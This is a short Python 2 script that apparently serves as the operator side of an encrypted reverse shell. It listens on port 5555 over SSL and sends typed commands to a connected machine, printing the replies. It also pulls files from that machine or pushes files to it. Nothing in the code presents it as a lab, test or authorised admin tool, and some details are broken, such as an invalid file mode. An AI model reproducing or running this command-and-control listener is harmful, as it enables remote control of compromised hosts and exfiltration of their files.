import socket, ssl

bindsocket = socket.socket()
bindsocket.bind(('', 5555))
bindsocket.listen(5)

def RecvData():
    temp = connstream.read()
    return temp

def SendData(inText):
    connstream.write(inText)

def DownloadFILE(fileName):
    fileDOWN = open(fileName, 'wa')
    while 1:
        temp = RecvData()
        if temp == 'CUF':
            break
        else: 
            fileDOWN.write(temp)
    fileDOWN.close()
    SendData("SDF") #Server Download Finished 

def UploadFILE(fileName):
    fileUP = open(fileName, 'rb')
    while 1:
        tempData = fileUP.read()
        if tempData == '':
            break
        else:
            SendData(tempData)
    fileUP.close()
    SendData("SUF") #Server Upload Finished

while True:
    newsocket, fromaddr = bindsocket.accept()
    connstream = ssl.wrap_socket(newsocket,
                                 server_side=True,
                                 certfile="priv_dom.crt",
                                 keyfile="private_key.key")
    while True:
        inText = raw_input('[input] ')
        if inText.startswith("download"):
            SendData(inText)
            DownloadFILE(inText.split(" ")[1])
        elif inText.startswith("upload"):
            SendData(inText)
            UploadFILE(inText.split(" ")[1])
            chunk = RecvData()
        else:
            connstream.write(inText)
            outTT = RecvData()
            print '[outText] ' + outTT
        # make a function to handle exit
        #connstream.shutdown(socket.SHUT_RDWR)
        #connstream.close()
